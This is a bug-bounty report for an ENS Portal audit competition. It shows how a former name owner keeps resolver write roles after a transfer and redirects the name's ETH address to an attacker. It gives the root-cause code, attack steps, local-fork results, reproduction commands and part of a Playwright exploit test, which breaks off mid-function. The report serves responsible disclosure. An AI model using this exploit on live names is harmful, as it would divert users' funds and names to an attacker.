# 90981 w a medium a former owner will redirect a transferred ens name to an attacker controlled address for the new owner by retaining permissionedresolver write authority&#x20;

**Submitted on Aug 28th 2026 at 16:07:44 UTC by @n3310y for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90981
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

When an ENS V2 name keeps a dedicated `PermissionedResolver` during transfer, the Portal transfers the ERC-1155 name token but does not revoke the seller's resolver write roles. The Portal's record-edit authorization then accepts the former owner because it checks resolver roles instead of current token ownership. A former owner can therefore use the normal Portal editor after the name is owned by someone else, change `addr(60)` to an attacker-controlled address, and cause the Portal to resolve and render the buyer's ENS name to that wrong recipient.

The primary impact leg then uses the Portal's own native **Transfer name** flow: a separate victim enters the poisoned ENS name, the Portal displays the attacker address, and the Portal submits the name transfer to that resolved address. Direct on-chain reads prove the victim-owned name's `ownerOf(tokenId)` changed to the attacker.

The separate `0.01 ETH` payment is retained only as secondary local-fork balance evidence because the Portal has no native ETH-send route.

## Vulnerability Details

ENS V2 separates the name token's ownership from the write permissions in a dedicated resolver. The token owner is read from the leaf `PermissionedRegistry.ownerOf(tokenId)`, while `ROLE_SET_ADDR` and `ROLE_SET_TEXT` are stored in the resolver. Moving the token does not inherently move those resolver roles.

This report concerns the Portal's handling of those two state domains; it does not submit a claim against the underlying ENS contracts, which are outside the supplied scope.

The Portal transfer route checks the connected wallet's ability to transfer the name and then renders `SendNameForm`. [`useTransferDetachTargets.ts:83-95`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts#L83-L95) makes the resolver option visible when the current seller has the registry role. It does not make resolver detachment mandatory and does not add a fallback role-revocation call when the option is turned off.

With a pre-existing ETH record and `detachResolver=false`, the real Portal plan is exactly:

```
set-eth-addr -> transfer-token
```

`set-eth-addr` reaches [`setEthAddress.ts:23-55`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/helpers/setEthAddress.ts#L23-L55), which calls `getResolver()`, creates `createSetForwardResolutionRequest()` for coin type 60, and submits `setForwardResolution()`.

`transfer-token` reaches the real `transferToken()` helper and submits the leaf-registry `safeTransferFrom()` call. Both steps succeed in the recorded run, and the on-chain owner changes to the buyer while the resolver address and former-owner roles remain unchanged.

After the transfer, the negative control is important. The buyer is the verified `ownerOf(tokenId)` but has no resolver write role, so the real Portal edit route displays `Permission Denied`. The former owner is not the token owner, but `useCanEditRecords()` sees the former owner's resolver role and allows the edit route. This proves that the observed authorization is role-based and stale, rather than a public-resolver or UI-only bypass.

Once the former owner edits the ETH row, [`saveRecords.ts:152-171`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/records/helpers/saveRecords.ts#L152-L171) waits for a mined success. The E2E test independently reads `ownerOf(tokenId)`, `getResolver(label)`, `addr(node, 60)`, `text(node, 'description')`, and both owners' resolver role bits. It then visits the real `/$name/address` route and asserts that the attacker-controlled address is rendered.

The primary impact proof continues through the Portal's native transfer implementation. [`SendNameForm.tsx:81-109`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/components/SendNameForm.tsx#L81-L109) passes the recipient field through `useAddressResolution()` and calls `startTransfer({ recipient, options })` only after the name has resolved. [`useAddressResolution.ts:38-63`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/address/hooks/useAddressResolution.ts#L38-L63) uses the shared resolved-address query, which calls `resolveAddressOrName()` through [`getResolvedAddress.ts:18-31`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/address/queries/getResolvedAddress.ts#L18-L31).

In the E2E run, `user4` enters the poisoned ENS name in this exact field, the displayed recipient is the attacker, and `useTransferName.ts:124-145` then executes the native `detachNameResolver()` and `transferToken()` steps. The receipt-backed `ownerOf(victimTokenId)` transition is therefore produced by the Portal's own state-changing flow; the separate ETH payment is not required to create or validate that primary loss.

The Manager also creates this class of resolver state in a real product flow. [`buildAtomicMigrationBatches.ts:396-405`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L396-L405) initializes a PermissionedResolver with `ROLES_ALL`, and [`buildAtomicMigrationBatches.ts:422-431`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts#L422-L431) separately authorizes wallet roles. The E2E fixture uses a dedicated resolver with the same role model; it does not mock or patch the Portal authorization code.

### Root Cause

The root cause is a lifecycle mismatch between ENS V2 name ownership and the separate role state held by a dedicated `PermissionedResolver`.

In [`useCanEditRecords.ts:38-41`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/records/hooks/useCanEditRecords.ts#L38-L41), the source documents the stale-role condition: a permissioned resolver is authorized by `ROLE_SET_*`, and after a transfer that keeps the resolver the previous owner typically retains those roles while the new token owner does not.

The authorization branch at [`useCanEditRecords.ts:106-116`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/records/hooks/useCanEditRecords.ts#L106-L116) implements that condition:

```ts
const hasResolverRole = roleQueries.some((query) => query.data === true)

const canEdit = (() => {
  if (!enabled || !connectedAddress || isLoading || !resolverAddress) {
    return false
  }

  if (isPermissioned) return hasResolverRole // @audit current token ownership is not required

  // Public / non-permissioned resolvers: token owner can edit.
  return isOwner
})()
```

`isOwner` is queried and returned, but it is used only for non-permissioned/V1-style resolvers. For a permissioned resolver, possession of a resolver role is sufficient. The code does not require `isOwner` or otherwise revoke the former owner's resolver role when the ERC-1155 name token moves.

The transfer UI makes the vulnerable state reachable. [`SendNameForm.tsx:68-95`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/components/SendNameForm.tsx#L68-L95) initializes `detachResolver` as an optional choice. Its warning at [`SendNameForm.tsx:46-51`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/components/SendNameForm.tsx#L46-L51) tells the seller that records keep resolving, but does not disclose that resolver-role holders keep write authority.

At [`buildTransferPlan.ts:27-40`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/utils/buildTransferPlan.ts#L27-L40), disabling resolver detachment produces a plan that updates the ETH address and then transfers the name token, with no resolver-detach or role-revocation step:

```ts
if (options.setEthAddress && !options.detachResolver) {
  steps.push('set-eth-addr')
}

if (options.detachResolver) {
  steps.push('detach-resolver') // @audit omitted when the seller keeps the resolver attached
}

steps.push('transfer-token')
```

That plan is executed by [`useTransferName.ts:124-145`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/hooks/useTransferName.ts#L124-L145), which invokes the production `setEthAddress()` and `transferToken()` helpers. The token step at [`transferToken.ts:63-94`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/helpers/transferToken.ts#L63-L94) submits the ERC-1155 `safeTransferFrom()` call to the leaf registry:

```ts
const data = encodeFunctionData({
  abi: erc1155Abi,
  functionName: 'safeTransferFrom',
  args: [walletWithAccount.account.address, recipient, tokenId, 1n, '0x'],
})

transactionManager.startTransaction(
  {
    type: 'custom',
    request: {
      type: 'eoa',
      from: walletWithAccount.account.address,
      to: registryAddress,
      data,
      value: 0n,
      chainId,
    },
  },
  signer,
  { id, description: `Transfer ${name}`, publicClient, chainId },
)
```

Nothing in that branch revokes the former owner's roles in the still-attached resolver. The subsequent record write is built by [`saveRecords.ts:125-170`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/records/helpers/saveRecords.ts#L125-L170): `setRecordsWriteParameters()` creates the resolver write, `encodeFunctionData()` encodes it, `toEoaCustomIntent()` binds it to the connected wallet address, and `transactionManager.startTransaction()` submits it and waits for the receipt.

### Attack Path

{% stepper %}
{% step %}

## Set up a dedicated PermissionedResolver

The setup registers a fresh ENS V2 `.eth` name on the isolated local Sepolia fork and deploys a dedicated `PermissionedResolver` proxy through the repository's real `VerifiableFactory.deployProxy()` path. The resolver is initialized for the seller with `ROLES_ALL`, creating the same role-based authorization model used by the product.
{% endstep %}

{% step %}

## Set a baseline ETH address

The seller connects to the real Portal with the repository's headless wallet fixture. The seller opens `/$name/edit-records`, adds the future buyer as the ETH `addr(60)` record, clicks Save, and completes the real `saveRecords()` transaction through `transactionManager`.
{% endstep %}

{% step %}

## Transfer while retaining the resolver

The seller opens `/$name/ownership/transfer`, enters the buyer address, and turns **Detach the resolver** off. The UI warning confirms that records remain resolving, but it does not say that existing resolver writers retain mutation authority.
{% endstep %}

{% step %}

## Execute the real transfer plan

The seller signs the real two-step transfer plan. `setEthAddress()` submits the recipient ETH record update, then `transferToken()` submits `safeTransferFrom(seller, buyer, tokenId, 1, '0x')` to the V2 leaf registry. There is no resolver-role revocation in this branch.
{% endstep %}

{% step %}

## Confirm stale resolver roles

The E2E test reads the chain. `ownerOf(tokenId)` is now the buyer, the resolver remains attached, the former seller still has root `ROLE_SET_ADDR` and `ROLE_SET_TEXT`, and the buyer has neither role.
{% endstep %}

{% step %}

## Verify the current owner is denied

The buyer is used as a negative control. The real Portal edit route displays `Permission Denied`, confirming that current token ownership alone does not grant edit access for this permissioned resolver.
{% endstep %}

{% step %}

## Reconnect as the former owner

The seller reconnects and opens the same edit route. `useCanEditRecords()` returns `canEdit=true` solely because the seller's resolver roles remain true, despite `isOwner=false`.
{% endstep %}

{% step %}

## Poison the ETH record

The seller changes the ETH row to `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC` and clicks Save. The Portal calls `setRecordsWriteParameters()`, encodes the resolver write, submits an EOA intent to the resolver proxy, and waits for the mined success receipt.
{% endstep %}

{% step %}

## Confirm poisoned resolution

The test reads the final state and visits `/$name/address`. The name remains owned by the buyer, but `addr(node, 60)` and the Portal's rendered resolution now point to the attacker's address.
{% endstep %}

{% step %}

## Resolve the poisoned name in the native transfer flow

A separate name is independently owned by `user4`. In the real Portal `/$victimName/ownership/transfer` route, `user4` enters the poisoned `name` as the recipient. The same Portal `useAddressResolution()` path displays the attacker's address, not the buyer address established in the baseline.
{% endstep %}

{% step %}

## Transfer the victim-owned name to the resolved attacker address

`user4` clicks **Transfer name** and completes the Portal's native transaction manager. The Portal submits `detachNameResolver()` followed by `transferToken()`/ERC-1155 `safeTransferFrom(user4, attacker, victimTokenId, 1, '0x')`. Direct chain reads prove `ownerOf(victimTokenId)` changes from `user4` to the attacker.
{% endstep %}

{% step %}

## Perform secondary settlement evidence

As secondary settlement evidence, the test takes the exact address rendered by the Portal and a fourth ordinary local wallet sends `0.01 ETH` to it. The receipt succeeds, the attacker recipient balance increases by exactly `0.01 ETH`, and the victim balance decreases by exactly `0.01 ETH` plus the measured gas fee. This payment is not needed to establish the primary Portal-transfer impact.
{% endstep %}
{% endstepper %}

## Impact Details

The direct demonstrated impact is persistent wrong-address resolution in the in-scope Portal. The buyer owns the ENS V2 name, but the former owner can change its payment-facing `addr(60)` record to an attacker-controlled address. The Portal's address-resolution page renders that attacker address for the buyer's name.

This directly matches the supplied Critical impact for causing the application to resolve or render an ENS name to an attacker-controlled address (`scope.md`, Critical impact #371). The severity classification does not depend on the separate Manager-flow wording in #372; #371 alone exactly covers this Explorer/Portal outcome.

The strengthened E2E run first executes a loss-producing Portal transaction, not a wallet-only payment: `user4` enters the poisoned ENS name in the Portal's native transfer form, the Portal resolves it to the attacker, and `ownerOf(tokenId)` for a separate victim-owned name changes from `user4` to the attacker. It then follows the same attacker address rendered by Portal and performs a separately measured `0.01 ETH` local payment.

Both receipts and all relevant state/balance deltas are asserted. These are isolated local-fork demonstrations of the scope #371 wrong-recipient consequence, not claims that live production funds or names were lost during testing.

The exact observed values in the passing run are:

| Quantity                                                         |                                                                                                                                                                     Observed value |
| ---------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
| Former owner's unauthorized record-write gas                     |                                                                                                                               `47,430,015,746,760 wei` (`0.00004743001574676 ETH`) |
| Seller-side baseline + transfer + attack gas in the recorded run |                                                                                                                             `234,517,582,202,268 wei` (`0.000234517582202268 ETH`) |
| Buyer-owned name after attack                                    |                                                                                                                    `ownerOf(tokenId) = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8` |
| ETH address before attack                                        |                                                                                                                                       `0x70997970c51812dc3a010c7d01b50e0d17dc79c8` |
| ETH address after attack                                         |                                                                                                                                       `0x3c44cdddb6a900fa2b585dd299e03d12fa4293bc` |
| Native Portal impact target name                                 |                                                                                                                                       `audit-stale-resolver-victim-1787930630.eth` |
| Native Portal impact target token ID                             |                                                                                                   `111691872372097001870290707158648147930855833852031452623577822318151830863872` |
| Native Portal impact owner before → after                        |                                                                                        `0x90F79bf6EB2c4f870365E785982E1f101E93b906` → `0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC` |
| Native Portal impact transactions                                | `0x3d60a09c3eed15c8a604fe2fc9f9276931e34d8b2750847659728422b2141384` (detach resolver), then `0x1e6f86e072f2dcdde79a3bf6bd773fa33c8128978aa90321a8b9eacd231b6995` (transfer token) |
| Native Portal impact gas                                         |                                                                                                                             `118,108,428,315,432 wei` (`0.000118108428315432 ETH`) |
| Local victim account                                             |                                                                                                                               `user4 = 0x90F79bf6EB2c4f870365E785982E1f101E93b906` |
| Downstream payment value                                         |                                                                                                                                          `10,000,000,000,000,000 wei` (`0.01 ETH`) |
| Downstream payment receipt                                       |                                                                                  `0x1bb9ed3cd62a0536dd2959c134f3fb273e4cb08087fa7e20a99a48bf602193b6`, block `11585712`, `success` |
| Victim balance before → after                                    |                                                                                                                    `9,999.998001125376627809 ETH` → `9,999.987980124719327809 ETH` |
| Attacker recipient balance before → after                        |                                                                                                                                                     `10,000 ETH` → `10,000.01 ETH` |
| Victim value loss                                                |                                                                                                                                          `10,000,000,000,000,000 wei` (`0.01 ETH`) |
| Victim gas fee                                                   |                                                                                                                                   `21,000,657,300,000 wei` (`0.0000210006573 ETH`) |
| Victim total balance loss                                        |                                                                                                                               `10,021,000,657,300,000 wei` (`0.0100210006573 ETH`) |
| Attacker recipient increase                                      |                                                                                                                                          `10,000,000,000,000,000 wei` (`0.01 ETH`) |

The security loss is control and integrity of the buyer's resolution: the buyer cannot repair the record through the same Portal because the buyer is denied by the role check.

The primary E2E impact is also a native Portal transaction: `user4` enters the poisoned name as a recipient, the Portal resolves it to the attacker, and the victim-owned `audit-stale-resolver-victim-1787930630.eth` changes owner from `user4` to the attacker in the mined ERC-1155 transfer.

The separate local ETH settlement then reads the same Portal-rendered address and sends `0.01 ETH` to it. The ETH victim's exact balance loss is the payment value plus the measured `21,000,657,300,000 wei` gas fee; the attacker-controlled recipient receives the full payment value.

The local amounts and generated name are reproducible proof quantities, not assertions that these exact values were lost on production or that they limit the amount a later production user could send.

### Risk Breakdown

This is a deterministic authenticated attack by a normal former name owner, not a privileged administrator and not a race.

The attacker needs only a name with a dedicated `PermissionedResolver` and the ability to complete a normal transfer while choosing the existing Portal option to keep the resolver attached. No buyer private key, buyer session, XSS, compromised RPC, wallet mismatch, HCA session, contract upgrade, or third-party service compromise is needed.

The attacker performs one ordinary post-transfer record edit from the same wallet that held the resolver role before transfer. The primary loss-producing step is then performed by a separate ordinary local user through the Portal's own native name-transfer flow after the Portal resolves the poisoned name to the attacker; it is not an attacker-controlled balance adjustment. The additional ETH payment is also performed by a separate ordinary local account after reading the real Portal output.

The exploit is highly reproducible: the transfer and unauthorized record write are mined in consecutive blocks in the E2E run, and the final resolver state is read directly from the chain. The negative control shows that the current buyer cannot perform the same action without a resolver role.

No buyer signature is needed to create the wrong resolution; a later ordinary user must choose to send funds, as with any wrong-recipient resolution. The PoC makes that later action explicit and quantifies its exact local balance effect.

Under the supplied scope, the correct category is **Web & App** and the correct claimed severity is **Critical**, because the demonstrated application outcome is exactly a wrong ENS address being resolved/rendered to an attacker-controlled recipient. The report uses scope #371 for this classification and clearly distinguishes reproducible local-fork payment evidence from a claim of live production loss.

## References

* Scope and severity: [`#scope`](https://immunefi.com/audit-competition/audit-competition-ens/scope/), Critical impact #371; in-scope asset `apps/portal` (the Explorer app).
* Known issues: (provided competition artifact). This finding is not listed. `QA-01` covers role combinations that cause later profile/primary-name errors and expressly says a demonstrated security consequence such as unintended authority would be a new finding. `WEB-1257` concerns a previous owner being unable to set a subname primary after a parent transfer; it does not cover a former owner successfully writing the transferred name's resolver and redirecting `addr(60)`. `WEB-1305` concerns a V2-to-V1 role transfer hanging. `R2-03` concerns a seven-day full-authority HCA session. `EXP-4337-003` concerns a caller-supplied `from` mismatch. None is the same root cause or impact.
* Program description: (provided competition artifact), including the priority on directing users to transfer funds to an unintended address.
* Production authorization: [`useCanEditRecords.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/records/hooks/useCanEditRecords.ts).
* Production transfer: [`SendNameForm.tsx`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/components/SendNameForm.tsx), [`buildTransferPlan.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/utils/buildTransferPlan.ts), [`useTransferName.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/hooks/useTransferName.ts), [`transferToken.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/helpers/transferToken.ts), and [`setEthAddress.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/transfer/helpers/setEthAddress.ts).
* Production recipient resolution: [`useAddressResolution.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/address/hooks/useAddressResolution.ts#L38-L63) and [`getResolvedAddress.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/address/queries/getResolvedAddress.ts#L13-L31).
* Production record write: [`saveRecords.ts`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/records/helpers/saveRecords.ts).
* Runnable reproduction source: the added `e2e/projects/portal/tests/audit-stale-resolver-access.spec.ts` file is reproduced in full below for submission and fresh-clone use; it is not present in the audited commit's GitHub tree because it is the PoC artifact added for this report.

## Proof of Concept

This is a runnable Playwright E2E attack test, not a unit test and not a source-text assertion. It starts the local fork and Portal, uses the real browser routes and transaction modal, submits real transactions through the Portal's production helpers and transaction manager, reads the resulting chain state with viem, verifies the final wrong address through the Portal's real address-resolution route, uses that wrong resolution in the Portal's own native name-transfer flow to produce a victim asset loss, and completes a separately labelled downstream local-wallet payment using the exact address rendered by that route.

### Target, environment, and repository state

* Repository: `audit-comp-ens`.
* Revision: `1c9b47f18fcddd2e864dfe385c4171061c9811ae` on `audit-comp-ready`.
* Network: chain ID `11155111` on the repository's isolated local Anvil Sepolia fork.
* Required local endpoints: Anvil `127.0.0.1:8545`, Portal `127.0.0.1:3001`, Panoptes GraphQL `127.0.0.1:5655`.
* Browser: Playwright Chromium installed by the repository's E2E package.
* The fixture mnemonic/accounts are local test accounts only. Do not use them or any generated key against a live network.

### Attacker model and fixture/setup authority

The attack actor is the former seller, who legitimately owns the ENS V2 token and holds the resolver roles before transfer. The attack actor controls the recipient address written after transfer. The buyer is a separate local account.

`user4` independently owns a second ENS V2 name and is the victim of the native Portal transfer; the same account is used for the optional ETH settlement after the name transfer.

Setup-only operations register the fresh names, deploy resolver proxies, initialize role state, and fund local accounts; those operations are not presented as attacker powers. The attack phase uses only the seller's normal Portal wallet and the buyer's normal transfer acceptance is not needed because the seller submits the token transfer in this local fixture.

### Fresh-repository reproduction instructions

Use a clean checkout at the target revision. If the repository is already present:

```sh
cd /path/to/audit-comp-ens
git checkout audit-comp-ready
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
```

From a fresh clone, the equivalent is:

```sh
git clone https://github.com/immunefi-team/audit-comp-ens.git
cd audit-comp-ens
git checkout audit-comp-ready
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
```

Install the workspace dependencies and the browser used by the test:

```sh
pnpm install
pnpm --filter @ens-apps/e2e exec playwright install chromium
```

Before running the test command, create `e2e/projects/portal/tests/audit-stale-resolver-access.spec.ts` and copy the complete TypeScript source from the [Complete PoC source](#complete-poc-source) subsection below into it. The file already exists at that path in the supplied audit workspace; it is not assumed to exist in a fresh upstream clone.

Start only the required isolated core services. This avoids an optional DQA health check obscuring the test:

```sh
docker compose -f e2e/infra/docker-compose.yml up -d anvil alto paymaster panoptes-indexer panoptes-api mockestrator
docker compose -f e2e/infra/docker-compose.yml ps
```

On this snapshot, a Panoptes container health label may remain `unhealthy` while the local GraphQL endpoint is usable. Confirm that the local Portal and GraphQL endpoints respond rather than stopping solely because of that label.

Start the real Portal in a second terminal with direct local RPC and GraphQL endpoints. Using direct endpoints makes it explicit that both the UI's reads and its transaction manager use the same local fork:

```sh
cd /path/to/audit-comp-ens
VITE_SEPOLIA_RPC_URL=http://127.0.0.1:8545 \
VITE_INDEXER_GRAPHQL_URL=http://127.0.0.1:5655/graphql \
pnpm --filter portal dev --host 127.0.0.1
```

Wait until `http://127.0.0.1:3001/` responds, then run the complete E2E attack from a third terminal:

```sh
cd /path/to/audit-comp-ens
ANVIL_RPC_URL=http://127.0.0.1:8545 \
PORTAL_APP_URL=http://127.0.0.1:3001 \
pnpm --filter @ens-apps/e2e exec playwright test \
  projects/portal/tests/audit-stale-resolver-access.spec.ts \
  --config=projects/portal/playwright.config.ts
```

The test registers two unique names on every run, so the recorded names, token IDs, resolver addresses, and transaction hashes are examples from one completed run and are not hard-coded prerequisites. The ETHRegistrar commitment wait is expected twice; a fresh run can take roughly two to three minutes.

A successful run must end with `1 passed` and must contain transaction-manager success states, chain reads showing buyer ownership plus stale role state, the Portal address-resolution assertion, a native Portal transfer whose `ownerOf(tokenId)` changes from `user4` to the resolved attacker, a successful downstream payment receipt, and matching victim/recipient balance deltas.

After the run, stop the isolated services:

```sh
docker compose -f e2e/infra/docker-compose.yml down
```

### Exact production call sequence exercised by the PoC

```
Seller UI: /$name/edit-records
  -> useSaveRecords()
  -> saveRecords()
  -> prepareSaveRecordsTransaction()
  -> ensjs setRecordsWriteParameters(client, { name, resolverAddress, coins: [...] })
  -> viem encodeFunctionData(writeParams.abi, writeParams.functionName, writeParams.args)
  -> toEoaCustomIntent({ from: walletClient.account.address, to: resolverAddress, data, chainId })
  -> transactionManager.startTransaction(intent, signer, { id: 'tx-save-resolver-records', ... })
  -> waitForTransaction(txId)

Seller UI: /$name/ownership/transfer with detachResolver=false
  -> useTransferName.getRuntime()
  -> getWalletClient(config, { account: owner })
  -> createEOASigner(walletClient)
  -> setEthAddress()
  -> getResolver()
  -> createSetForwardResolutionRequest({ name, coinType: 60, resolverAddress, targetAddress: recipient })
  -> setForwardResolution()
  -> transferToken()
  -> encodeFunctionData({ functionName: 'safeTransferFrom', args: [from, recipient, tokenId, 1n, '0x'] })
  -> transactionManager.startTransaction(eoaIntent, signer, ...)
  -> waitForTransaction(txId)

Former seller UI: /$name/edit-records after ownerOf(tokenId) changes
  -> useCanEditRecords() returns canEdit=true from stale resolver roles
  -> saveRecords()
  -> setRecordsWriteParameters()
  -> encodeFunctionData()
  -> toEoaCustomIntent()
  -> transactionManager.startTransaction()
  -> waitForTransaction()
  -> resolver addr(node, 60) changes to attackerRecipient

Impact UI: /$name/address
  -> reads the changed resolver record
  -> renders attackerRecipient for the buyer-owned name

Native Portal impact UI: /$victimName/ownership/transfer
  -> user4 enters the poisoned name as the recipient
  -> SendNameForm.useAddressResolution()
  -> getResolvedAddressQueryOptions()
  -> resolveAddressOrName({ nameOrAddress: name })
  -> rendered resolved recipient is attackerRecipient (not the buyer baseline)
  -> useTransferName()
  -> detachNameResolver() via transactionManager.startTransaction()
  -> transferToken()
  -> encodeFunctionData({ functionName: 'safeTransferFrom', args: [user4, attackerRecipient, victimTokenId, 1n, '0x'] })
  -> transactionManager.startTransaction()
  -> waitForTransaction()
  -> ownerOf(victimTokenId) changes user4 -> attackerRecipient

Separate ordinary local settlement user:
  -> page.getByText(attackerRecipient, { exact: true }).innerText()
  -> getAddress(displayedRecipient)
  -> privateKeyToAccount(accounts.getPrivateKey('user4'))
  -> walletClient.sendTransaction({ account: victimAccount, to: victimRecipient, value: parseEther('0.01') })
  -> receipt succeeds; recipient gains 0.01 ETH; victim loses 0.01 ETH + gas
```

### Complete PoC source

The following is the exact source of the test file used for the recorded passing run. Copy it verbatim to `e2e/projects/portal/tests/audit-stale-resolver-access.spec.ts` before running the command above:

```ts
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import type { Web3ProviderBackend } from '@ensdomains/headless-web3-provider'
import type { Page } from '@playwright/test'
import {
  type Address,
  formatEther,
  getAddress,
  type Hash,
  keccak256,
  namehash,
  parseAbi,
  parseEther,
  toHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import {
  connectWithHeadlessWallet,
  expect,
  test,
} from '../../../fixtures/playwright.portal.fixture.js'
import { publicClient, walletClient } from '../../../helpers/anvil-client.js'
import { authorizeTransaction } from '../../../helpers/portal-auth.js'

const PORTAL_APP_URL = process.env.PORTAL_APP_URL ?? 'http://localhost:3001'
const sepoliaContracts = ensL1Contracts[supportedL1Chains.sepolia]
const V2_REGISTRY = sepoliaContracts.ensRegistry.address as Address

const REGISTRY_ABI = parseAbi([
  'function getTokenId(uint256 anyId) view returns (uint256)',
  'function ownerOf(uint256 tokenId) view returns (address)',
  'function getResolver(string label) view returns (address)',
])

const RESOLVER_ABI = parseAbi([
  'function addr(bytes32 node, uint256 coinType) view returns (bytes)',
  'function text(bytes32 node, string key) view returns (string)',
  'function hasRootRoles(uint256 roleBitmap, address account) view returns (bool)',
])

const ETH_COIN_TYPE = 60n
const ROLE_SET_ADDR = 1n << 0n
const ROLE_SET_TEXT = 1n << 4n

type ReceiptLog = {
  hash: Hash
  blockNumber: bigint
  to: Address | null
  gasUsed: bigint
  effectiveGasPrice: bigint
  feeWei: bigint
}

function normalized(value: string): string {
  return value.toLowerCase()
}

function labelOf(name: string): string {
  if (!name.endsWith('.eth')) throw new Error(`Expected .eth name: ${name}`)
  return name.slice(0, -'.eth'.length)
}

function getFreshBlockNumber(): Promise<bigint> {
  return publicClient.getBlockNumber({ cacheTime: 0 })
}

async function readGroundTruthForAccounts(
  name: string,
  resolverAddress: Address,
  formerOwner: Address,
  currentOwner: Address,
) {
  const label = labelOf(name)
  const node = namehash(name)
  const labelHash = BigInt(keccak256(toHex(label)))
  const tokenId = await publicClient.readContract({
    address: V2_REGISTRY,
    abi: REGISTRY_ABI,
    functionName: 'getTokenId',
    args: [labelHash],
  })
  const [
    owner,
    resolver,
    ethAddress,
    description,
    formerOwnerCanWriteText,
    formerOwnerCanWriteAddr,
    currentOwnerCanWriteText,
    currentOwnerCanWriteAddr,
  ] = await Promise.all([
    publicClient.readContract({
      address: V2_REGISTRY,
      abi: REGISTRY_ABI,
      functionName: 'ownerOf',
      args: [tokenId],
    }),
    publicClient.readContract({
      address: V2_REGISTRY,
      abi: REGISTRY_ABI,
      functionName: 'getResolver',
      args: [label],
    }),
    publicClient.readContract({
      address: resolverAddress,
      abi: RESOLVER_ABI,
      functionName: 'addr',
      args: [node, ETH_COIN_TYPE],
    }),
    publicClient.readContract({
      address: resolverAddress,
      abi: RESOLVER_ABI,
      functionName: 'text',
      args: [node, 'description'],
    }),
    publicClient.readContract({
      address: resolverAddress,
      abi: RESOLVER_ABI,
      functionName: 'hasRootRoles',
      args: [ROLE_SET_TEXT, formerOwner],
    }),
    publicClient.readContract({
      address: resolverAddress,
      abi: RESOLVER_ABI,
      functionName: 'hasRootRoles',
      args: [ROLE_SET_ADDR, formerOwner],
    }),
    publicClient.readContract({
      address: resolverAddress,
      abi: RESOLVER_ABI,
      functionName: 'hasRootRoles',
      args: [ROLE_SET_TEXT, currentOwner],
    }),
    publicClient.readContract({
      address: resolverAddress,
      abi: RESOLVER_ABI,
      functionName: 'hasRootRoles',
      args: [ROLE_SET_ADDR, currentOwner],
    }),
  ])

  return {
    tokenId,
    node,
    owner,
    resolver,
    ethAddress,
    description,
